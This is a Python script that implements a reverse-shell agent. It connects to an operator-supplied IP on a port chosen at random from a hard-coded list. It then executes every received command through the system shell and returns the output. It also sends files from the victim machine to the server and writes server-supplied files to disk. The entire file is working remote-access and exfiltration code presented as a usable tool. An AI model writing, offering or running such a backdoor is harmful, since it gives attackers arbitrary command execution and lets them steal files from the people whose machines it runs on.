import socket
import subprocess
import os
import random
import argparse

list=[2748, 5327, 6985, 4190, 8451, 1742, 3154, 6938, 8265, 4557,
4859, 5643, 1694, 5372, 8823, 7014, 2987, 7486, 3148, 6172,
4139, 9296, 8932, 1547, 8310, 4822, 3447, 7845, 1783, 6432,
1359, 6157, 9978, 2526, 3689, 6201, 4165, 7582, 4091, 2534,
5673, 4203, 3015, 7194, 1429, 6652, 7539, 4613, 7054, 5817,
9736, 6723, 4886, 1398, 9064, 2257, 6834, 9372, 4271, 7589,
6592, 4761, 8347, 5701, 1904, 8472, 3591, 1234, 9865, 5938,
7142, 8602, 3628, 5418, 2753, 8971, 6314, 8046, 3819, 1847,
5369, 2490, 6982, 5741, 9405, 8023, 5178, 7893, 2804, 1542,
9438, 6823, 5274, 4768, 8150, 6925, 3706, 2819, 6198, 7482
]
def parse_args():
    parser = argparse.ArgumentParser(description='Client script with IP address option.')
    parser.add_argument('-ip', '--ip_addr', type=str, required=True, help='Server IP address')
    return parser.parse_args()

args = parse_args()

agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (args.ip_addr, random.choice(list))
# Connect to the server
agent_socket.connect(server_address)
main_directory = os.getcwd()
print("Current working directory: " + main_directory)

while True:
    command = agent_socket.recv(1024).decode('utf-8')

    if command.lower() == "exit":
        break

    if command.startswith("cd "):
        # Handle directory change
        directory = command[3:]
        try:
            os.chdir(directory)
            main_directory = os.getcwd()
            print("Current working directory: " + main_directory)

            response = f"Changed directory to: {os.getcwd()}"
            agent_socket.send(response.encode('utf-8'))

        except FileNotFoundError:
            response = f"Directory not found: {directory}"
            agent_socket.send(response.encode('utf-8'))

    elif command.lower().startswith("download"):
        file_name = command.split()[1]
        file_path = os.path.join(main_directory, file_name)

        if os.path.exists(file_path):
            file_size = os.path.getsize(file_path)
            agent_socket.send(str(file_size).encode('utf-8'))

            try:
                with open(file_path, 'rb') as file:
                    data = file.read(4096)
                    while data:
                        agent_socket.send(data)
                        data = file.read(4096)
                    print(f"File '{file_name}' sent successfully.")

                # Wait for an acknowledgment from the server
                ack = agent_socket.recv(1024).decode('utf-8')
                if ack == "ReceivedFile":
                    agent_socket.send(b"ReadyForCommands")
            except Exception as e:
                response = f"Error sending file: {str(e)}"
                agent_socket.send(response.encode('utf-8'))
        else:
            try:
                # Execute the command and capture the output
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                response = output
            except subprocess.CalledProcessError as e:
                response = str(e)

            agent_socket.send(response.encode('utf-8'))

    elif command.lower().startswith("upload"):
        file_name = command.split()[1]

        # Receiving file size (8 bytes for long integer)
        file_size_data = agent_socket.recv(8)
        file_size = int.from_bytes(file_size_data, 'big')

        # Now receive the file data
        file_data = b''
        while len(file_data) < file_size:
            packet = agent_socket.recv(file_size - len(file_data))
            if not packet:
                break
            file_data += packet

        # Write the received data to a file
        with open(file_name, 'wb') as file:
            file.write(file_data)
        print(f"File '{file_name}' received from the server.")

    else:
        try:
            # Execute the command and capture the output
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            response = output
        except subprocess.CalledProcessError as e:
            response = str(e)

        # Implement a loop to send all data if it's too large for one send operation
        for i in range(0, len(response), 1024):
            agent_socket.send(response[i:i + 1024].encode('utf-8'))

agent_socket.close()
